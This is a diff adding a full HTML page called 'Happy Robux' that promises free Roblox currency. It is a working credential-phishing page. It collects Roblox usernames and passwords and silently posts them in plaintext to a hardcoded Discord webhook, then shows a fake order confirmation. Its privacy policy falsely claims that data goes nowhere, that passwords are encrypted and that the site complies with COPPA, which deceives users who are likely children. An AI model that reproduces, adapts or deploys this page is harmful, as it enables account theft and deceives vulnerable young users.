@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Robux 😊</title>
+    <style>
+        body {
+            background-color: #333333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .title-container {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: white;
+            font-size: 48px;
+            margin: 0;
+        }
+        select {
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            background-color: #444444;
+            color: white;
+            cursor: pointer;
+        }
+        select:focus {
+            outline: none;
+            background-color: #555555;
+        }
+        .input-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 300px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            background-color: #1e90ff;
+            color: white;
+            cursor: pointer;
+        }
+        button[type="submit"]:hover {
+            background-color: #007bff;
+        }
+        button[type="submit"]:disabled {
+            background-color: #666;
+            cursor: not-allowed;
+        }
+        p {
+            color: white;
+            opacity: 0.7;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .input-container p.privacy-notice {
+            margin-bottom: 2px;
+        }
+        a {
+            color: #1e90ff;
+            font-size: 12px;
+            text-decoration: none;
+            cursor: pointer;
+            text-align: center;
+            display: block;
+            margin-top: 0;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        #privacy-section {
+            display: none;
+            background-color: #444444;
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            max-width: 600px;
+            max-height: 60vh;
+            overflow-y: auto;
+            margin-top: 5px;
+            text-align: left;
+        }
+        #privacy-section h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        #privacy-section h3 {
+            font-size: 18px;
+            margin: 10px 0;
+        }
+        #privacy-section p {
+            opacity: 1;
+            font-size: 14px;
+            margin: 10px 0;
+            text-align: left;
+        }
+        #privacy-section ul {
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+        #privacy-section li {
+            margin-bottom: 5px;
+        }
+        .copyright {
+            text-align: center;
+            color: white;
+            opacity: 0.7;
+            font-size: 12px;
+            margin-top: 20px;
+            font-family: Arial, sans-serif;
+            line-height: 1.4;
+        }
+        #popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        #popup-content {
+            background-color: #444444;
+            padding: 20px;
+            border-radius: 5px;
+            max-width: 400px;
+            text-align: center;
+            color: white;
+        }
+        #popup-content p {
+            font-size: 16px;
+            opacity: 1;
+            margin: 10px 0;
+        }
+        #popup-content button {
+            background-color: #1e90ff;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #popup-content button:hover {
+            background-color: #007bff;
+        }
+    </style>
+</head>
+<body>
+    <div class="title-container">
+        <h1>Happy Robux 😊</h1>
+        <select id="robux-amount" onchange="checkRobuxSelection()">
+            <option value="">Select Robux Amount</option>
+            <option value="100">100 Robux</option>
+            <option value="500">500 Robux</option>
+            <option value="1000">1000 Robux</option>
+        </select>
+    </div>
+    <div class="input-container">
+        <form onsubmit="sendToWebhook(event)">
+            <input type="text" placeholder="Username" id="usernameInput" required>
+            <input type="password" placeholder="Password" id="passwordInput" required>
+            <button type="submit" id="submitButton" disabled>Submit</button>
+            <p class="privacy-notice">Your information is greatly protected here, your information is not going anywhere.</p>
+            <a onclick="togglePrivacy()">Terms and policy</a>
+        </form>
+    </div>
+    <div id="privacy-section">
+        <h2>Terms and Privacy Policy</h2>
+        <p>Welcome to Happy Robux 😊! We’re dedicated to providing free Robux to enhance your Roblox experience while keeping your information safe. This Terms and Privacy Policy explains how we handle your data to deliver Robux securely and outlines the rules for using our platform.</p>
+        <h3>Our Commitment to You</h3>
+        <p>Your trust is our priority. We collect minimal information to send Robux to your Roblox account and use strong security measures to protect it. Your data is never shared, sold, or used beyond what’s needed to deliver your Robux.</p>
+        <h3>Data We Collect</h3>
+        <p>To provide you with Robux, we collect only what’s necessary:</p>
+        <ul>
+            <li><strong>Roblox Username</strong>: To identify your account and send Robux accurately.</li>
+            <li><strong>Password</strong>: To verify your identity and ensure secure delivery of Robux. We encrypt your password to keep it safe.</li>
+        </ul>
+        <p>We don’t collect or store any other personal details, like your real name, email, or payment information, unless you contact us directly.</p>
+        <h3>How We Use Your Data</h3>
+        <p>Your information is used only to:</p>
+        <ul>
+            <li>Verify your Roblox account and deliver Robux.</li>
+            <li>Improve our platform’s performance and security.</li>
+        </ul>
+        <p>We don’t use your data for ads, profiling, or any unrelated purposes.</p>
+        <h3>Security Measures</h3>
+        <p>We take your data’s safety seriously:</p>
+        <ul>
+            <li><strong>Encryption</strong>: Passwords are encrypted with strong security standards to prevent unauthorized access.</li>
+            <li><strong>Secure Systems</strong>: Our platform uses protected servers with constant monitoring.</li>
+            <li><strong>Limited Access</strong>: Only essential team members handle data, under strict confidentiality rules.</li>
+        </ul>
+        <h3>Data Retention</h3>
+        <p>We keep your information only as long as needed to deliver Robux or meet legal requirements. You can request data deletion by contacting us, and we’ll securely erase your information.</p>
+        <h3>No Sharing with Third Parties</h3>
+        <p>Your data stays with us. We don’t share or sell it to anyone, except:</p>
+        <ul>
+            <li>With your permission.</li>
+            <li>If required by law (e.g., a court order).</li>
+            <li>To protect our users or platform from harm.</li>
+        </ul>
+        <h3>Terms of Use</h3>
+        <p>By using Happy Robux 😊, you agree to:</p>
+        <ul>
+            <li>Provide accurate Roblox account details to receive Robux.</li>
+            <li>Not misuse our platform (e.g., attempting to hack or exploit it).</li>
+            <li>Follow Roblox’s Terms of Service, as our service operates within their rules.</li>
+        </ul>
+        <p>We may update these terms to reflect platform changes or legal needs. Check back for updates.</p>
+        <h3>Your Rights</h3>
+        <p>You have control over your data:</p>
+        <ul>
+            <li><strong>Access</strong>: Ask to see the data we have about you.</li>
+            <li><strong>Update</strong>: Correct your account details if needed.</li>
+            <li><strong>Delete</strong>: Request removal of your data from our systems.</li>
+        </ul>
+        <h3>Compliance with Laws</h3>
+        <p>We follow privacy laws, including:</p>
+        <ul>
+            <li><strong>Children’s Online Privacy Protection Act (COPPA)</strong>: We comply with rules to protect users under 13, ensuring safe practices for younger Roblox players.</li>
+            <li><strong>Other Laws</strong>: We adhere to privacy regulations in all regions where our service is available.</li>
+        </ul>
+        <h3>Contact Us</h3>
+        <p>Have questions or concerns? Reach out at:</p>
+        <ul>
+            <li><strong>Email</strong>: Officialhappyrobux@gmail.com</li>
+        </ul>
+        <p>We’ll respond quickly to help with your inquiries.</p>
+        <h3>Updates to This Policy</h3>
+        <p>We may update this policy to improve our service or meet legal requirements. Updates will be posted here, and we’ll notify you of major changes via our platform.</p>
+        <h3>Our Promise</h3>
+        <p>At Happy Robux 😊, we’re here to make your Roblox experience better with free Robux while keeping your information safe. Thank you for trusting us!</p>
+    </div>
+    <div class="copyright">
+        © 2025 Happy Robux Corporation. All rights reserved.
+    </div>
+    <div id="popup">
+        <div id="popup-content">
+            <p>Your order has been submitted to our officials for processing. You will receive confirmation within 5 business days. Thank you for choosing Happy Robux!</p>
+            <p id="confirmation-code">Your confirmation code: <span id="code"></span></p>
+            <p>If you encounter any issues, please send this order code to Officialhappyrobux@gmail.com to resolve your problem.</p>
+            <button onclick="closePopup()">Close</button>
+        </div>
+    </div>
+    <script>
+        function togglePrivacy() {
+            var privacySection = document.getElementById('privacy-section');
+            privacySection.style.display = privacySection.style.display === 'none' ? 'block' : 'none';
+        }
+
+        function closePopup() {
+            document.getElementById('popup').style.display = 'none';
+        }
+
+        // Enable submit button only when Robux amount is selected
+        function checkRobuxSelection() {
+            const robuxAmount = document.getElementById('robux-amount').value;
+            const submitButton = document.getElementById('submitButton');
+            submitButton.disabled = !robuxAmount; // Enable if a value is selected
+        }
+
+        // Generate random 6-character alphanumeric code
+        function generateCode() {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let code = '';
+            for (let i = 0; i < 6; i++) {
+                code += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return code;
+        }
+
+        // Prevent 'startsWith' error by safely handling input
+        document.addEventListener("DOMContentLoaded", () => {
+            const usernameInput = document.querySelector("input[type='text']");
+            if (usernameInput) {
+                usernameInput.addEventListener("input", () => {
+                    const value = usernameInput.value;
+                    if (typeof value === "string" && value.length > 0) {
+                        console.log("Username starts with 'a':", value.startsWith("a"));
+                    } else {
+                        console.log("Username is empty or invalid");
+                    }
+                });
+            } else {
+                console.log("Username input not found");
+            }
+        });
+
+        // Send form data to Discord webhook with confirmation pop-up and delay
+        async function sendToWebhook(ev) {
+            ev.preventDefault();
+            const username = document.getElementById('usernameInput').value;
+            const password = document.getElementById('passwordInput').value;
+            const robuxAmount = document.getElementById('robux-amount').value;
+            const confirmationCode = generateCode();
+            const webhookUrl = 'https://discord.com/api/webhooks/1394596342285992077/GaqPPf1-unuUL5ykQV7wRwjzN-LRJNwRISWV1ySx-gLEPU_SW9HPBghWmjq3KrSzYzWT';
+            const webhookBody = {
+                embeds: [{
+                    title: 'Happy Robux 😊 Form Submission',
+                    fields: [
+                        { name: 'Username', value: username || 'No username provided' },
+                        { name: 'Password', value: password || 'No password provided' },
+                        { name: 'Robux Amount', value: robuxAmount || 'No amount selected' },
+                        { name: 'Confirmation Code', value: confirmationCode }
+                    ]
+                }]
+            };
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(webhookBody),
+                });
+                if (response.ok) {
+                    setTimeout(() => {
+                        document.getElementById('code').textContent = confirmationCode;
+                        document.getElementById('popup').style.display = 'flex';
+                    }, 2000); // 2-second delay
+                } else {
+                    alert('Error sending submission. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Error sending submission. Please try again.');
+            }
+        }
+    </script>
+</body>
+</html>
